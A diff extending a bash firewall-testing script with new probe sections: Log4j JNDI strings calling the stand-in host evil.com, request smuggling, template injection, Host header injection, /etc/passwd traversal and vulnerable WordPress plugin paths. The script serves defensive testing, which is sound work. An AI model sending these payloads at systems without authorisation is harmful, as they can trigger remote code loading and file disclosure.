@@ -618,6 +618,93 @@ else
     warn "POST to shell.php returned ${post_code}"
 fi
 
+# -- 3.8 Log4j / JNDI Injection --
+log ""
+log "3.8 Log4j / JNDI Injection Probes"
+
+test_waf "Log4j: jndi:ldap"        "/?x=%24%7Bjndi:ldap://evil.com/a%7D"
+test_waf "Log4j: jndi:rmi"         "/?x=%24%7Bjndi:rmi://evil.com/a%7D"
+test_waf "Log4j: jndi:dns"         "/?x=%24%7Bjndi:dns://evil.com%7D"
+test_waf "Log4j: nested"           "/?x=%24%7Bj%24%7B::-n%7Ddi:ldap://evil.com%7D"
+
+# Log4j in headers
+for hdr in X-Forwarded-For X-Api-Version Referer X-Client-IP; do
+    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
+        -H "User-Agent: ${BROWSER_UA}" \
+        -H "${hdr}: \${jndi:ldap://evil.com/a}" \
+        "${PROTO}://${TARGET}/" 2>/dev/null) || true
+    if [ "$code" = "403" ] || [ "$code" = "444" ]; then
+        pass "Log4j in ${hdr} blocked -> ${code}"
+    else
+        info "Log4j in ${hdr} -> ${code}"
+    fi
+done
+
+# -- 3.9 HTTP Request Smuggling / Desync --
+log ""
+log "3.9 HTTP Request Smuggling Probes"
+
+smuggle_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
+    -H "User-Agent: ${BROWSER_UA}" \
+    -H "Transfer-Encoding: chunked" \
+    -H "Transfer-Encoding: x" \
+    "${PROTO}://${TARGET}/" 2>/dev/null) || true
+if [ "$smuggle_code" = "400" ] || [ "$smuggle_code" = "403" ]; then
+    pass "TE.CL duplicate header rejected -> ${smuggle_code}"
+else
+    info "TE.CL duplicate header -> ${smuggle_code}"
+fi
+
+# -- 3.10 Server-Side Template Injection (SSTI) --
+log ""
+log "3.10 SSTI Probes"
+
+test_waf "SSTI: Jinja2"           "/?name=%7B%7B7*7%7D%7D"
+test_waf "SSTI: Twig"            "/?name=%7B%7B_self.env.display%7D%7D"
+test_waf "SSTI: config"          "/?name=%7B%7Bconfig.__class__.__init__.__globals__%7D%7D"
+
+# -- 3.11 Host Header Attacks --
+log ""
+log "3.11 Host Header Attacks"
+
+host_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
+    -H "User-Agent: ${BROWSER_UA}" \
+    -H "Host: evil.com" \
+    "${PROTO}://${TARGET}/" 2>/dev/null) || true
+if [ "$host_code" = "400" ] || [ "$host_code" = "403" ] || [ "$host_code" = "444" ]; then
+    pass "Host header injection blocked -> ${host_code}"
+else
+    info "Host header injection -> ${host_code} (check redirect target)"
+fi
+
+# -- 3.12 HTTP Method Probes --
+log ""
+log "3.12 HTTP Method Probes"
+
+for method in TRACE TRACK DELETE PUT; do
+    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
+        -H "User-Agent: ${BROWSER_UA}" \
+        -X "$method" "${PROTO}://${TARGET}/" 2>/dev/null) || true
+    if [ "$method" = "TRACE" ] || [ "$method" = "TRACK" ]; then
+        if [ "$code" = "405" ] || [ "$code" = "403" ] || [ "$code" = "501" ]; then
+            pass "${method} method blocked -> ${code}"
+        else
+            warn "${method} method allowed -> ${code} (info disclosure risk)"
+        fi
+    else
+        info "${method} method -> ${code}"
+    fi
+done
+
+# -- 3.13 Protocol Abuse --
+log ""
+log "3.13 Protocol Enforcement"
+
+test_waf "Protocol: null byte URL"      "/%00"
+test_waf "Protocol: backslash"          "/..\\..\\..\\etc\\passwd"
+test_waf "Protocol: overlong UTF-8"     "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+test_waf "Protocol: semicolon"          "/;/admin"
+
 # ============================================================================
 # PHASE 4: WORDPRESS ATTACKS
 # ============================================================================
@@ -801,6 +888,62 @@ test_dirlist "/wp-content/uploads/"
 test_dirlist "/wp-content/plugins/"
 test_dirlist "/wp-content/themes/"
 test_dirlist "/wp-includes/"
+
+# -- 4.6 WordPress REST API Probes --
+log ""
+log "4.6 WordPress REST API Probes"
+
+# Unauthenticated settings endpoint
+test_sensitive "/wp-json/wp/v2/settings"
+test_sensitive "/wp-json/wp/v2/posts?per_page=100&status=draft"
+test_sensitive "/wp-json/wp/v2/pages?per_page=100&status=draft"
+
+# Application Passwords endpoint
+app_pwd_code=$(http_code "${PROTO}://${TARGET}/wp-json/wp/v2/users/1/application-passwords")
+if [ "$app_pwd_code" = "401" ] || [ "$app_pwd_code" = "403" ]; then
+    pass "Application Passwords endpoint requires auth -> ${app_pwd_code}"
+elif [ "$app_pwd_code" = "200" ]; then
+    fail "Application Passwords endpoint accessible without auth"
+else
+    info "Application Passwords endpoint -> ${app_pwd_code}"
+fi
+
+# -- 4.7 WordPress Plugin/Theme Vulnerability Probes --
+log ""
+log "4.7 Plugin/Theme Vulnerability Probes"
+
+# Common vulnerable plugin paths
+for vuln_path in \
+    "/wp-content/plugins/revslider/temp/update_extract/" \
+    "/wp-content/plugins/formcraft/file-upload/server/php/" \
+    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
+    "/wp-content/plugins/easy-wp-smtp/readme.txt" \
+    "/wp-content/plugins/duplicator/installer.php" \
+    "/wp-content/uploads/wc-logs/" \
+    "/wp-content/uploads/sucuri/" \
+    "/wp-content/uploads/backups/"; do
+    code=$(http_code "${PROTO}://${TARGET}${vuln_path}")
+    if [ "$code" = "200" ]; then
+        warn "Potentially vulnerable path accessible: ${vuln_path}"
+    elif [ "$code" = "403" ]; then
+        pass "Blocked: ${vuln_path} -> 403"
+    else
+        info "${vuln_path} -> ${code}"
+    fi
+done
+
+# -- 4.8 wp-cron Abuse --
+log ""
+log "4.8 wp-cron.php Accessibility"
+
+cron_code=$(http_code "${PROTO}://${TARGET}/wp-cron.php")
+if [ "$cron_code" = "200" ]; then
+    warn "wp-cron.php accessible externally (DDoS amplification risk)"
+elif [ "$cron_code" = "403" ]; then
+    pass "wp-cron.php blocked -> 403"
+else
+    info "wp-cron.php -> ${cron_code}"
+fi
 
 # ============================================================================
 # PHASE 5: DASHBOARD & API EXPOSURE
